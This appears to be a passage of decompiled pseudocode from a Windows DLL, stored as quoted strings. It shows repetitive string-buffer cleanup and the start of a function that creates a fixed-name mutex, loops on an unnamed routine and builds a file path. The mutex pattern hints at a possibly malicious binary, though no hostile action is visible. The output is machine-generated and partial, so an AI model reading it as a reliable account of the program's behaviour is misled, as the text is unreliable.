    "      if ( (unsigned int)((char *)Block[0] - (char *)v186 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v187;",
    "    sub_100154EB(v186);",
    "  }",
    "  if ( v262 > 0xF )",
    "  {",
    "    v188 = (CHAR *)lpCmdLine[0];",
    "    v189 = v262 + 1;",
    "    if ( v262 + 1 >= 0x1000 )",
    "    {",
    "      v188 = (CHAR *)*((_DWORD *)lpCmdLine[0] - 1);",
    "      v189 = v262 + 36;",
    "      if ( (unsigned int)(lpCmdLine[0] - (LPCSTR)v188 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v189;",
    "    sub_100154EB(v188);",
    "  }",
    "  lpCmdLine[4] = 0;",
    "  v262 = 15;",
    "  LOBYTE(lpCmdLine[0]) = 0;",
    "  if ( v304 > 0xF )",
    "  {",
    "    v190 = v302[0];",
    "    v191 = v304 + 1;",
    "    if ( v304 + 1 >= 0x1000 )",
    "    {",
    "      v190 = (void *)*((_DWORD *)v302[0] - 1);",
    "      v191 = v304 + 36;",
    "      if ( (unsigned int)((char *)v302[0] - (char *)v190 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v191;",
    "    sub_100154EB(v190);",
    "  }",
    "  v303 = 0;",
    "  v304 = 15;",
    "  LOBYTE(v302[0]) = 0;",
    "  if ( v268 > 0xF )",
    "  {",
    "    v192 = v266[0];",
    "    v193 = v268 + 1;",
    "    if ( v268 + 1 >= 0x1000 )",
    "    {",
    "      v192 = (void *)*((_DWORD *)v266[0] - 1);",
    "      v193 = v268 + 36;",
    "      if ( (unsigned int)((char *)v266[0] - (char *)v192 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v193;",
    "    sub_100154EB(v192);",
    "  }",
    "  v267 = 0;",
    "  v268 = 15;",
    "  LOBYTE(v266[0]) = 0;",
    "  if ( v292 > 0xF )",
    "  {",
    "    v194 = v290[0];",
    "    v195 = v292 + 1;",
    "    if ( v292 + 1 >= 0x1000 )",
    "    {",
    "      v194 = (void *)*((_DWORD *)v290[0] - 1);",
    "      v195 = v292 + 36;",
    "      if ( (unsigned int)((char *)v290[0] - (char *)v194 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v195;",
    "    sub_100154EB(v194);",
    "  }",
    "  v291 = 0;",
    "  v292 = 15;",
    "  LOBYTE(v290[0]) = 0;",
    "  if ( v271 > 0xF )",
    "  {",
    "    v196 = v269[0];",
    "    v197 = v271 + 1;",
    "    if ( v271 + 1 >= 0x1000 )",
    "    {",
    "      v196 = (void *)*((_DWORD *)v269[0] - 1);",
    "      v197 = v271 + 36;",
    "      if ( (unsigned int)((char *)v269[0] - (char *)v196 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v197;",
    "    sub_100154EB(v196);",
    "  }",
    "  v270 = 0;",
    "  v271 = 15;",
    "  LOBYTE(v269[0]) = 0;",
    "  if ( v289 > 0xF )",
    "  {",
    "    v198 = v287[0];",
    "    v199 = v289 + 1;",
    "    if ( v289 + 1 >= 0x1000 )",
    "    {",
    "      v198 = (void *)*((_DWORD *)v287[0] - 1);",
    "      v199 = v289 + 36;",
    "      if ( (unsigned int)((char *)v287[0] - (char *)v198 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v199;",
    "    sub_100154EB(v198);",
    "  }",
    "  v288 = 0;",
    "  v289 = 15;",
    "  LOBYTE(v287[0]) = 0;",
    "  if ( v265 > 0xF )",
    "  {",
    "    v200 = v263[0];",
    "    v201 = v265 + 1;",
    "    if ( v265 + 1 >= 0x1000 )",
    "    {",
    "      v200 = (void *)*((_DWORD *)v263[0] - 1);",
    "      v201 = v265 + 36;",
    "      if ( (unsigned int)((char *)v263[0] - (char *)v200 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v201;",
    "    sub_100154EB(v200);",
    "  }",
    "  v264 = 0;",
    "  v265 = 15;",
    "  LOBYTE(v263[0]) = 0;",
    "  if ( v258 > 0xF )",
    "  {",
    "    v202 = v256[0];",
    "    v203 = v258 + 1;",
    "    if ( v258 + 1 >= 0x1000 )",
    "    {",
    "      v202 = (void *)*((_DWORD *)v256[0] - 1);",
    "      v203 = v258 + 36;",
    "      if ( (unsigned int)((char *)v256[0] - (char *)v202 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v203;",
    "    sub_100154EB(v202);",
    "  }",
    "  Size = 0;",
    "  v258 = 15;",
    "  LOBYTE(v256[0]) = 0;",
    "  if ( v286 > 0xF )",
    "  {",
    "    v204 = v284[0];",
    "    v205 = v286 + 1;",
    "    if ( v286 + 1 >= 0x1000 )",
    "    {",
    "      v204 = (void *)*((_DWORD *)v284[0] - 1);",
    "      v205 = v286 + 36;",
    "      if ( (unsigned int)((char *)v284[0] - (char *)v204 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v205;",
    "    sub_100154EB(v204);",
    "  }",
    "  v285 = 0;",
    "  v286 = 15;",
    "  LOBYTE(v284[0]) = 0;",
    "  if ( HIDWORD(v245) > 7 )",
    "  {",
    "    v206 = v244[0];",
    "    v207 = 2 * HIDWORD(v245) + 2;",
    "    if ( v207 >= 0x1000 )",
    "    {",
    "      v206 = (void *)*((_DWORD *)v244[0] - 1);",
    "      v207 = 2 * HIDWORD(v245) + 37;",
    "      if ( (unsigned int)((char *)v244[0] - (char *)v206 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v207;",
    "    sub_100154EB(v206);",
    "  }",
    "  if ( v283 > 7 )",
    "  {",
    "    v208 = v281[0];",
    "    v209 = 2 * v283 + 2;",
    "    if ( v209 >= 0x1000 )",
    "    {",
    "      v208 = (void *)*((_DWORD *)v281[0] - 1);",
    "      v209 = 2 * v283 + 37;",
    "      if ( (unsigned int)((char *)v281[0] - (char *)v208 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v209;",
    "    sub_100154EB(v208);",
    "  }",
    "  v282 = 0;",
    "  v283 = 7;",
    "  LOWORD(v281[0]) = 0;",
    "  if ( v255 > 7 )",
    "  {",
    "    bufsiz = (void *)v253._bufsiz;",
    "    v211 = 2 * v255 + 2;",
    "    if ( v211 >= 0x1000 )",
    "    {",
    "      bufsiz = *(void **)(v253._bufsiz - 4);",
    "      v211 = 2 * v255 + 37;",
    "      if ( (unsigned int)(v253._bufsiz - (_DWORD)bufsiz - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v211;",
    "    sub_100154EB(bufsiz);",
    "  }",
    "  v254 = 0;",
    "  v255 = 7;",
    "  LOWORD(v253._bufsiz) = 0;",
    "  if ( v280 > 7 )",
    "  {",
    "    v212 = v278[0];",
    "    v213 = 2 * v280 + 2;",
    "    if ( v213 >= 0x1000 )",
    "    {",
    "      v212 = (void *)*((_DWORD *)v278[0] - 1);",
    "      v213 = 2 * v280 + 37;",
    "      if ( (unsigned int)((char *)v278[0] - (char *)v212 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v213;",
    "    sub_100154EB(v212);",
    "  }",
    "  v279 = 0;",
    "  v280 = 7;",
    "  LOWORD(v278[0]) = 0;",
    "  if ( v277 > 7 )",
    "  {",
    "    v214 = v275[0];",
    "    v215 = 2 * v277 + 2;",
    "    if ( v215 >= 0x1000 )",
    "    {",
    "      v214 = (void *)*((_DWORD *)v275[0] - 1);",
    "      v215 = 2 * v277 + 37;",
    "      if ( (unsigned int)((char *)v275[0] - (char *)v214 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v215;",
    "    sub_100154EB(v214);",
    "  }",
    "  v276 = 0;",
    "  v277 = 7;",
    "  LOWORD(v275[0]) = 0;",
    "  if ( v301 > 7 )",
    "  {",
    "    v216 = v299[0];",
    "    v217 = 2 * v301 + 2;",
    "    if ( v217 >= 0x1000 )",
    "    {",
    "      v216 = (void *)*((_DWORD *)v299[0] - 1);",
    "      v217 = 2 * v301 + 37;",
    "      if ( (unsigned int)((char *)v299[0] - (char *)v216 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v217;",
    "    sub_100154EB(v216);",
    "  }",
    "  v300 = 0;",
    "  v301 = 7;",
    "  LOWORD(v299[0]) = 0;",
    "  if ( v250 > 0xF )",
    "  {",
    "    v218 = v249[0];",
    "    v219 = v250 + 1;",
    "    if ( v250 + 1 >= 0x1000 )",
    "    {",
    "      v218 = (void *)*((_DWORD *)v249[0] - 1);",
    "      v219 = v250 + 36;",
    "      if ( (unsigned int)((char *)v249[0] - (char *)v218 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v219;",
    "    sub_100154EB(v218);",
    "  }",
    "  v249[4] = 0;",
    "  v250 = 15;",
    "  LOBYTE(v249[0]) = 0;",
    "  if ( v260[1] > 7u )",
    "  {",
    "    v220 = 2 * v260[1] + 2;",
    "    v221 = (CHAR *)Src[0];",
    "    if ( v220 >= 0x1000 )",
    "    {",
    "      v220 = 2 * v260[1] + 37;",
    "      v222 = (char *)Src[0] - *((_DWORD *)Src[0] - 1);",
    "      lpMultiByteStr = (LPCCH)*((_DWORD *)Src[0] - 1);",
    "      if ( (unsigned int)(v222 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "      v221 = (CHAR *)lpMultiByteStr;",
    "    }",
    "    v238 = v220;",
    "    sub_100154EB(v221);",
    "  }",
    "  if ( v295 > 7 )",
    "  {",
    "    v223 = v293[0];",
    "    v224 = 2 * v295 + 2;",
    "    if ( v224 >= 0x1000 )",
    "    {",
    "      v223 = (void *)*((_DWORD *)v293[0] - 1);",
    "      v224 = 2 * v295 + 37;",
    "      if ( (unsigned int)((char *)v293[0] - (char *)v223 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v224;",
    "    sub_100154EB(v223);",
    "  }",
    "  v294 = 0;",
    "  v295 = 7;",
    "  LOWORD(v293[0]) = 0;",
    "  if ( v248 > 7 )",
    "  {",
    "    v225 = v246[0];",
    "    v226 = 2 * v248 + 2;",
    "    if ( v226 >= 0x1000 )",
    "    {",
    "      v225 = (void *)*((_DWORD *)v246[0] - 1);",
    "      v226 = 2 * v248 + 37;",
    "      if ( (unsigned int)((char *)v246[0] - (char *)v225 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v226;",
    "    sub_100154EB(v225);",
    "  }",
    "  if ( v274 > 0xF )",
    "  {",
    "    v227 = *(CHAR **)PathName;",
    "    v228 = v274 + 1;",
    "    if ( v274 + 1 < 0x1000",
    "      || (v227 = *(CHAR **)(*(_DWORD *)PathName - 4),",
    "          v228 = v274 + 36,",
    "          (unsigned int)(*(_DWORD *)PathName - (_DWORD)v227 - 4) <= 0x1F) )",
    "    {",
    "      v238 = v228;",
    "      sub_100154EB(v227);",
    "      return 1;",
    "    }",
    "LABEL_360:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __usercall sub_1000F100@<al>(int a1@<ecx>, size_t a2@<ebx>)",
    "{",
    "  int v2; // ecx",
    "  int *v3; // esi",
    "  _DWORD *v4; // esi",
    "  void **v5; // eax",
    "  void **v6; // eax",
    "  _DWORD *v7; // esi",
    "  void **v8; // eax",
    "  void **v9; // eax",
    "  const CHAR *v10; // eax",
    "  int v11; // esi",
    "  void **v12; // ecx",
    "  unsigned int v13; // edi",
    "  char *v14; // edx",
    "  char *v15; // esi",
    "  void *v16; // edx",
    "  int v17; // ecx",
    "  void *v18; // edx",
    "  size_t v19; // ecx",
    "  void *v20; // edx",
    "  size_t v21; // ecx",
    "  void **v22; // eax",
    "  void *v23; // eax",
    "  LPCCH v24; // edi",
    "  _DWORD *v25; // edi",
    "  void **v26; // eax",
    "  void **v27; // ecx",
    "  void **v28; // eax",
    "  int v29; // eax",
    "  void **v30; // ecx",
    "  int v31; // edi",
    "  unsigned int v32; // ecx",
    "  void **v33; // eax",
    "  int v34; // esi",
    "  void **v35; // eax",
    "  void **v36; // eax",
    "  char *v37; // eax",
    "  void **v38; // ecx",
    "  int v39; // eax",
    "  void **v40; // ecx",
    "  int v41; // edi",
    "  unsigned int v42; // ecx",
    "  void **v43; // eax",
    "  int v44; // esi",
    "  void **v45; // eax",
    "  void **v46; // eax",
    "  char *v47; // eax",
    "  void **v48; // ecx",
    "  int v49; // eax",
    "  void **v50; // ecx",
    "  int v51; // edi",
    "  unsigned int v52; // ecx",
    "  void **v53; // eax",
    "  int v54; // esi",
    "  int v55; // edx",
    "  void **v56; // ecx",
    "  void **v57; // edx",
    "  int v58; // ecx",
    "  int v59; // edi",
    "  void **v60; // esi",
    "  void **v61; // ecx",
    "  int v62; // edx",
    "  void **v63; // edx",
    "  int v64; // ecx",
    "  int v65; // edi",
    "  void **v66; // esi",
    "  void **v67; // eax",
    "  void **v68; // ecx",
    "  void **v69; // eax",
    "  int v70; // eax",
    "  void **v71; // ecx",
    "  int v72; // edi",
    "  int v73; // ecx",
    "  void **v74; // ecx",
    "  size_t v75; // esi",
    "  _DWORD *v76; // edi",
    "  void **v77; // eax",
    "  void **v78; // ecx",
    "  void **v79; // eax",
    "  int v80; // eax",
    "  void **v81; // ecx",
    "  int v82; // edi",
    "  int v83; // ecx",
    "  void **v84; // ecx",
    "  size_t v85; // esi",
    "  void **v86; // eax",
    "  void **v87; // ecx",
    "  void **v88; // eax",
    "  int v89; // eax",
    "  void **v90; // ecx",
    "  int v91; // edi",
    "  int v92; // ecx",
    "  void **v93; // ecx",
    "  size_t v94; // esi",
    "  int v95; // ecx",
    "  void **v96; // eax",
    "  void **v97; // ecx",
    "  size_t v98; // edi",
    "  int v99; // edx",
    "  void **v100; // eax",
    "  char *v101; // esi",
    "  void **v102; // eax",
    "  void **v103; // ecx",
    "  int v104; // edx",
    "  void **v105; // eax",
    "  void **v106; // ecx",
    "  size_t v107; // edi",
    "  int v108; // edx",
    "  void **v109; // eax",
    "  char *v110; // esi",
    "  void **v111; // eax",
    "  void *v112; // edx",
    "  int v113; // ecx",
    "  void *v114; // edx",
    "  int v115; // ecx",
    "  void *v116; // edx",
    "  size_t v117; // ecx",
    "  void **v118; // eax",
    "  void **v119; // ecx",
    "  void **v120; // eax",
    "  int v121; // eax",
    "  void **v122; // ecx",
    "  int v123; // edi",
    "  int v124; // ecx",
    "  void **v125; // ecx",
    "  size_t v126; // esi",
    "  void **v127; // eax",
    "  void **v128; // eax",
    "  void **v129; // ecx",
    "  char *v130; // eax",
    "  int v131; // eax",
    "  void **v132; // ecx",
    "  int v133; // edi",
    "  int v134; // ecx",
    "  void **v135; // ecx",
    "  int v136; // esi",
    "  void **v137; // eax",
    "  void **v138; // ecx",
    "  void **v139; // eax",
    "  int v140; // eax",
    "  void **v141; // ecx",
    "  int v142; // edi",
    "  int v143; // ecx",
    "  void **v144; // ecx",
    "  size_t v145; // esi",
    "  HWND ConsoleWindow; // eax",
    "  void **v147; // ecx",
    "  int v148; // edx",
    "  void **v149; // ecx",
    "  size_t v150; // edi",
    "  int v151; // edx",
    "  void **v152; // eax",
    "  char *v153; // esi",
    "  void **v154; // ecx",
    "  int v155; // edx",
    "  void **v156; // esi",
    "  _BYTE *v157; // esi",
    "  void **v158; // ecx",
    "  int v159; // edx",
    "  void **v160; // ecx",
    "  size_t v161; // edi",
    "  int v162; // edx",
    "  void **v163; // eax",
    "  char *v164; // esi",
    "  void **v165; // ecx",
    "  int v166; // edx",
    "  void **v167; // ecx",
    "  int v168; // edx",
    "  void **v169; // ecx",
    "  size_t v170; // edi",
    "  int v171; // edx",
    "  void **v172; // eax",
    "  char *v173; // esi",
    "  void **v174; // ecx",
    "  int v175; // edx",
    "  void **v176; // ecx",
    "  size_t v177; // edi",
    "  int v178; // edx",
    "  void **v179; // eax",
    "  char *v180; // esi",
    "  void **v181; // ecx",
    "  int v182; // edx",
    "  void **v183; // ecx",
    "  int v184; // edx",
    "  void **v185; // ecx",
    "  size_t v186; // edi",
    "  int v187; // edx",
    "  void **v188; // eax",
    "  char *v189; // esi",
    "  CHAR *v190; // eax",
    "  HWND v191; // eax",
    "  const CHAR *v192; // eax",
    "  const CHAR *v193; // eax",
    "  void *v194; // edx",
    "  size_t v195; // ecx",
    "  void *v196; // edx",
    "  size_t v197; // ecx",
    "  CHAR *v198; // edx",
    "  size_t v199; // ecx",
    "  void *v200; // edx",
    "  size_t v201; // ecx",
    "  void *v202; // edx",
    "  size_t v203; // ecx",
    "  void *v204; // edx",
    "  size_t v205; // ecx",
    "  void *v206; // edx",
    "  size_t v207; // ecx",
    "  void *v208; // edx",
    "  int v209; // ecx",
    "  void *v210; // edx",
    "  size_t v211; // ecx",
    "  void *v212; // edx",
    "  size_t v213; // ecx",
    "  void *v214; // edx",
    "  unsigned int v215; // ecx",
    "  void *v216; // edx",
    "  unsigned int v217; // ecx",
    "  CHAR *v218; // edx",
    "  size_t v219; // ecx",
    "  void *v220; // edx",
    "  size_t v221; // ecx",
    "  void *v222; // edx",
    "  size_t v223; // ecx",
    "  void *v224; // edx",
    "  unsigned int v225; // ecx",
    "  void *v226; // edx",
    "  unsigned int v227; // ecx",
    "  void *v228; // edx",
    "  unsigned int v229; // ecx",
    "  void *v230; // edx",
    "  unsigned int v231; // ecx",
    "  void *v232; // edx",
    "  size_t v233; // ecx",
    "  void *v234; // edx",
    "  int v235; // ecx",
    "  void *v236; // edx",
    "  unsigned int v237; // ecx",
    "  void *v238; // edx",
    "  size_t v239; // ecx",
    "  CHAR *v240; // edx",
    "  size_t v241; // ecx",
    "  void *v242; // edx",
    "  size_t v243; // ecx",
    "  void *v244; // edx",
    "  size_t v245; // ecx",
    "  void *v246; // edx",
    "  size_t v247; // ecx",
    "  void *v248; // edx",
    "  size_t v249; // ecx",
    "  void *v250; // edx",
    "  size_t v251; // ecx",
    "  _DWORD *v253; // [esp-48h] [ebp-374h] BYREF",
    "  int v254; // [esp-44h] [ebp-370h]",
    "  int v255; // [esp-40h] [ebp-36Ch]",
    "  int v256; // [esp-3Ch] [ebp-368h]",
    "  unsigned int v257; // [esp-38h] [ebp-364h]",
    "  unsigned int v258; // [esp-34h] [ebp-360h]",
    "  _DWORD *v259; // [esp-30h] [ebp-35Ch] BYREF",
    "  int v260; // [esp-2Ch] [ebp-358h]",
    "  int v261; // [esp-28h] [ebp-354h]",
    "  int v262; // [esp-24h] [ebp-350h]",
    "  unsigned int v263; // [esp-20h] [ebp-34Ch]",
    "  unsigned int v264; // [esp-1Ch] [ebp-348h]",
    "  CHAR *v265; // [esp-18h] [ebp-344h] BYREF",
    "  int v266; // [esp-14h] [ebp-340h]",
    "  int v267; // [esp-10h] [ebp-33Ch]",
    "  int v268; // [esp-Ch] [ebp-338h]",
    "  const char *v269; // [esp-8h] [ebp-334h]",
    "  size_t v270; // [esp-4h] [ebp-330h]",
    "  void *v271[4]; // [esp+Ch] [ebp-320h] BYREF",
    "  __int64 v272; // [esp+1Ch] [ebp-310h]",
    "  void *v273[4]; // [esp+24h] [ebp-308h] BYREF",
    "  __int64 v274; // [esp+34h] [ebp-2F8h]",
    "  int v275; // [esp+3Ch] [ebp-2F0h]",
    "  int v276; // [esp+40h] [ebp-2ECh]",
    "  int v277; // [esp+44h] [ebp-2E8h]",
    "  void *v278[4]; // [esp+48h] [ebp-2E4h] BYREF",
    "  int v279; // [esp+58h] [ebp-2D4h]",
    "  unsigned int v280; // [esp+5Ch] [ebp-2D0h]",
    "  void *v281; // [esp+60h] [ebp-2CCh]",
    "  void *v282; // [esp+64h] [ebp-2C8h]",
    "  LPCCH v283; // [esp+68h] [ebp-2C4h]",
    "  _DWORD *v284; // [esp+6Ch] [ebp-2C0h]",
    "  int v285; // [esp+70h] [ebp-2BCh]",
    "  void *v286; // [esp+74h] [ebp-2B8h]",
    "  int v287; // [esp+78h] [ebp-2B4h]",
    "  int v288; // [esp+7Ch] [ebp-2B0h]",
    "  void *v289[5]; // [esp+80h] [ebp-2ACh] BYREF",
    "  unsigned int v290; // [esp+94h] [ebp-298h]",
    "  void *v291[5]; // [esp+98h] [ebp-294h] BYREF",
    "  unsigned int v292; // [esp+ACh] [ebp-280h]",
    "  void *v293[4]; // [esp+B0h] [ebp-27Ch]",
    "  __int64 v294; // [esp+C0h] [ebp-26Ch]",
    "  void *v295[5]; // [esp+C8h] [ebp-264h] BYREF",
    "  unsigned int v296; // [esp+DCh] [ebp-250h]",
    "  void *v297[5]; // [esp+E0h] [ebp-24Ch] BYREF",
    "  unsigned int v298; // [esp+F4h] [ebp-238h]",
    "  LPCCH lpMultiByteStr[5]; // [esp+F8h] [ebp-234h] BYREF",
    "  unsigned int v300; // [esp+10Ch] [ebp-220h]",
    "  void *v301[5]; // [esp+110h] [ebp-21Ch] BYREF",
    "  unsigned int v302; // [esp+124h] [ebp-208h]",
    "  void *v303[5]; // [esp+128h] [ebp-204h] BYREF",
    "  unsigned int v304; // [esp+13Ch] [ebp-1F0h]",
    "  size_t v305[2]; // [esp+140h] [ebp-1ECh] BYREF",
    "  int cbMultiByte[2]; // [esp+148h] [ebp-1E4h] BYREF",
    "  void *v307[5]; // [esp+150h] [ebp-1DCh] BYREF",
    "  unsigned int v308; // [esp+164h] [ebp-1C8h]",
    "  void *v309[5]; // [esp+168h] [ebp-1C4h] BYREF",
    "  unsigned int v310; // [esp+17Ch] [ebp-1B0h]",
    "  void *v311[5]; // [esp+180h] [ebp-1ACh] BYREF",
    "  unsigned int v312; // [esp+194h] [ebp-198h]",
    "  CHAR PathName[16]; // [esp+198h] [ebp-194h] BYREF",
    "  size_t v314; // [esp+1A8h] [ebp-184h]",
    "  unsigned int v315; // [esp+1ACh] [ebp-180h]",
    "  void *v316[4]; // [esp+1B0h] [ebp-17Ch] BYREF",
    "  size_t v317; // [esp+1C0h] [ebp-16Ch]",
    "  unsigned int v318; // [esp+1C4h] [ebp-168h]",
    "  void *Block[4]; // [esp+1C8h] [ebp-164h] BYREF",
    "  __int64 v320; // [esp+1D8h] [ebp-154h]",
    "  LPCSTR lpCmdLine[5]; // [esp+1E0h] [ebp-14Ch] BYREF",
    "  unsigned int v322; // [esp+1F4h] [ebp-138h]",
    "  void *v323[4]; // [esp+1F8h] [ebp-134h] BYREF",
    "  int v324; // [esp+208h] [ebp-124h]",
    "  unsigned int v325; // [esp+20Ch] [ebp-120h]",
    "  void *v326[4]; // [esp+210h] [ebp-11Ch] BYREF",
    "  int v327; // [esp+220h] [ebp-10Ch]",
    "  unsigned int v328; // [esp+224h] [ebp-108h]",
    "  void *v329[4]; // [esp+228h] [ebp-104h] BYREF",
    "  int v330; // [esp+238h] [ebp-F4h]",
    "  unsigned int v331; // [esp+23Ch] [ebp-F0h]",
    "  void *v332[4]; // [esp+240h] [ebp-ECh] BYREF",
    "  int v333; // [esp+250h] [ebp-DCh]",
    "  unsigned int v334; // [esp+254h] [ebp-D8h]",
    "  void *Src[4]; // [esp+258h] [ebp-D4h] BYREF",
    "  int v336; // [esp+268h] [ebp-C4h]",
    "  unsigned int v337; // [esp+26Ch] [ebp-C0h]",
    "  void *v338[4]; // [esp+270h] [ebp-BCh] BYREF",
    "  int v339; // [esp+280h] [ebp-ACh]",
    "  unsigned int v340; // [esp+284h] [ebp-A8h]",
    "  void *v341[4]; // [esp+288h] [ebp-A4h] BYREF",
    "  size_t v342; // [esp+298h] [ebp-94h]",
    "  unsigned int v343; // [esp+29Ch] [ebp-90h]",
    "  void *v344[4]; // [esp+2A0h] [ebp-8Ch] BYREF",
    "  size_t v345; // [esp+2B0h] [ebp-7Ch]",
    "  unsigned int v346; // [esp+2B4h] [ebp-78h]",
    "  void *v347[4]; // [esp+2B8h] [ebp-74h] BYREF",
    "  size_t v348; // [esp+2C8h] [ebp-64h]",
    "  unsigned int v349; // [esp+2CCh] [ebp-60h]",
    "  void *v350[4]; // [esp+2D0h] [ebp-5Ch] BYREF",
    "  size_t Size; // [esp+2E0h] [ebp-4Ch]",
    "  unsigned int v352; // [esp+2E4h] [ebp-48h]",
    "  void *v353[4]; // [esp+2E8h] [ebp-44h] BYREF",
    "  int v354; // [esp+2F8h] [ebp-34h]",
    "  unsigned int v355; // [esp+2FCh] [ebp-30h]",
    "  void *v356[4]; // [esp+300h] [ebp-2Ch] BYREF",
    "  int v357; // [esp+310h] [ebp-1Ch]",
    "  unsigned int v358; // [esp+314h] [ebp-18h]",
    "  int v359; // [esp+31Bh] [ebp-11h] BYREF",
    "  int v360; // [esp+328h] [ebp-4h]",
    "",
    "  v288 = a1;",
    "  sub_1000D1E0();",
    "  CreateMutexW(0, 1, L\"08808\");",
    "  v2 = dword_100408A0;",
    "  if ( !dword_100408A0 )",
    "  {",
    "    v285 = (int)&unk_1003FB50;",
    "    if ( _Mtx_lock((_Mtx_t)&unk_1003FB50) )",
    "      std::_Throw_Cpp_error(5);",
    "    if ( dword_1003FB7C == 0x7FFFFFFF )",
    "    {",
    "      dword_1003FB7C = 2147483646;",
    "      std::_Throw_Cpp_error(6);",
    "    }",
    "    v360 = 0;",
    "    if ( !dword_100408A0 )",
    "    {",
    "      v285 = (int)operator new(1u);",
    "      dword_100408A0 = v285;",
    "    }",
    "    v360 = -1;",
    "    _Mtx_unlock((_Mtx_t)&unk_1003FB50);",
    "    v2 = dword_100408A0;",
    "  }",
    "  sub_10008F90(v2, a2, (int)v289);",
    "  v360 = 1;",
    "  v287 = dword_100408A8;",
    "  if ( !dword_100408A8 )",
    "  {",
    "    v285 = (int)&unk_1003FBB0;",
    "    if ( _Mtx_lock((_Mtx_t)&unk_1003FBB0) )",
    "      std::_Throw_Cpp_error(5);",
    "    if ( dword_1003FBDC == 0x7FFFFFFF )",
    "    {",
    "      dword_1003FBDC = 2147483646;",
    "      std::_Throw_Cpp_error(6);",
    "    }",
    "    LOBYTE(v360) = 2;",
    "    if ( !dword_100408A8 )",
    "    {",
    "      v3 = (int *)operator new(8u);",
    "      v282 = v3;",
    "      LOBYTE(v360) = 3;",
    "      *(_QWORD *)v3 = 0;",
    "      *v3 = sub_10002FE0();",
    "      v3[1] = sub_1000A970();",
    "      dword_100408A8 = (int)v3;",
    "    }",
    "    LOBYTE(v360) = 1;",
    "    _Mtx_unlock((_Mtx_t)&unk_1003FBB0);",
    "    v287 = dword_100408A8;",
    "  }",
    "  v4 = (_DWORD *)sub_10002FE0();",
    "  v284 = v4;",
    "  sub_10009E70(&v265, v4 + 492);",
    "  sub_1000B000(v307, v265, v266, v267, v268, (unsigned int)v269, v270);",
    "  LOBYTE(v360) = 4;",
    "  v5 = v307;",
    "  if ( v308 > 0xF )",
    "    v5 = (void **)v307[0];",
    "  v276 = (int)v5;",
    "  sub_10009E70(&v265, v4 + 498);",
    "  sub_1000B000(v309, v265, v266, v267, v268, (unsigned int)v269, v270);",
    "  LOBYTE(v360) = 5;",
    "  v6 = v309;",
    "  if ( v310 > 0xF )",
    "    v6 = (void **)v309[0];",
    "  v285 = (int)&v265;",
    "  v275 = (int)v6;",
    "  sub_10009E70(&v259, v284 + 162);",
    "  sub_1000B000(&v265, v259, v260, v261, v262, v263, v264);",
    "  v7 = v284;",
    "  LOBYTE(v360) = 6;",
    "  sub_10009E70(&v259, v284 + 528);",
    "  LOBYTE(v360) = 5;",
    "  sub_1000B970(v303, v259, v260, v261, v262, v263, v264, v265, v266, v267, v268, (int)v269, v270);",
    "  LOBYTE(v360) = 7;",
    "  v8 = v303;",
    "  if ( v304 > 0xF )",
    "    v8 = (void **)v303[0];",
    "  v277 = (int)v8;",
    "  sub_10009E70(v311, v289);",
    "  LOBYTE(v360) = 8;",
    "  v9 = v311;",
    "  if ( v312 > 0xF )",
    "    v9 = (void **)v311[0];",
    "  v281 = v9;",
    "  sub_10009E70(&v265, v7 + 504);",
    "  sub_1000B000(lpMultiByteStr, v265, v266, v267, v268, (unsigned int)v269, v270);",
    "  LOBYTE(v360) = 9;",
    "  v10 = (const CHAR *)lpMultiByteStr;",
    "  v11 = v276;",
    "  if ( v300 > 0xF )",
    "    v10 = lpMultiByteStr[0];",
    "  v283 = v10;",
    "  *(double *)v305 = 0.0;",
    "  LOBYTE(v359) = 0;",
    "  do",
    "  {",
    "    sub_10011D60(0, v11, v10, v275, v281, &v359, v305, v277);",
    "    v10 = v283;",
    "  }",
    "  while ( (_BYTE)v359 != 1 );",
    "  v285 = (int)(v284 + 324);",
    "  sub_10009E70(&v265, v284 + 324);",
    "  v281 = sub_1000B000(v326, v265, v266, v267, v268, (unsigned int)v269, v270);",
    "  LOBYTE(v360) = 10;",
    "  v283 = (LPCCH)&v259;",
    "  sub_10009E70(&v253, v284);",
    "  sub_1000B000(&v259, v253, v254, v255, v256, v257, v258);",
    "  LOBYTE(v360) = 11;",
    "  v282 = v284 + 312;",
    "  sub_10009E70(&v253, v284 + 312);",
    "  LOBYTE(v360) = 10;",
    "  sub_1000B970(&v265, v253, v254, v255, v256, v257, v258, v259, v260, v261, v262, v263, v264);",
    "  v12 = (void **)sub_1000BA90(v323, v265, v266, v267, v268, (size_t)v269, v270);",
    "  LOBYTE(v360) = 12;",
    "  v13 = (unsigned int)v12[5];",
    "  v14 = (char *)v12[4];",
    "  if ( v13 == (_DWORD)v14 )",
    "  {",
    "    LOBYTE(v283) = 0;",
    "    v12 = sub_1000A260(v12, 1u, (int)v283, \"\\\\\", 1u);",
    "  }",
    "  else",
    "  {",
    "    v15 = (char *)v12;",
    "    v12[4] = v14 + 1;",
    "    if ( v13 > 0xF )",
    "      v15 = (char *)*v12;",
    "    strcpy(&v14[(_DWORD)v15], \"\\\\\");",
    "  }",
